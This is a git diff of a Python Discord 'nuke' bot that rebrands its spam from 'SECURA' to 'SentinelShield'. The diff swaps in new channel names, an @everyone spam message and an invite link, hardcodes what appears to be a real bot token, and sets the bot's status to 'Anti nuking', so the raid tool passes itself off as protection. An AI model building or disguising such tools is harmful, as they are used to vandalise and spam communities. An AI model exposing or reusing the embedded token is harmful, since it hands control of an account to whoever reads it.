@@ -5,11 +5,11 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 from webserver import keep_alive
-token = ""
+token = "MTQzMjEzMzA5Mjc5NzE5MDE2NA.GHWIuC.AaY7UIfCmTgydWec-AlxEgTV2HnwB-lU4SVPio"
 
 
-SPAM_CHANNEL =  ["Secura runs you" , "Get Banned" , "NUKED" , "oops Secura","F IN CHAT SECURA","Should Have Listened","Get NUKED clowns","Nuked by SECURA ","oops got nuked","I run you","Nuked by SECURA","I run you","kinda got nuked by yourself"]
-SPAM_MESSAGE = ["@everyone You Got Nuked by SECURA https://discord.gg/Fbrduwmz9k RIP 67"]
+SPAM_CHANNEL =  ["SentinelShield runs you" , "Get fuckeg" , "NUKED" , "oops SentinelShield","F IN CHAT SentinelShield","Should Have Listened","Get NUKED clowns","Nuked by SentinelShield ","oops got nuked","I run you","Nuked by SentinelShield","I run you","Big ty to adam"]
+SPAM_MESSAGE = ["@everyone You Got Nuked by SentinelShield https://discord.gg/tWP6PmSPrv RIP 67"]
 
 client = commands.Bot(command_prefix="?", intents=discord.Intents.all())
 
@@ -25,10 +25,10 @@ async def on_ready():
 ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
 ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
 
-Support Server:https://discord.gg/Fbrduwmz9k
+Support Server:https://discord.gg/tWP6PmSPrv
  J
  ''')
-   await client.change_presence(activity=discord.Game(name="Just got RickRolled"))
+   await client.change_presence(activity=discord.Game(name="Anti nuking"))
 
 @client.command()
 @commands.is_owner()
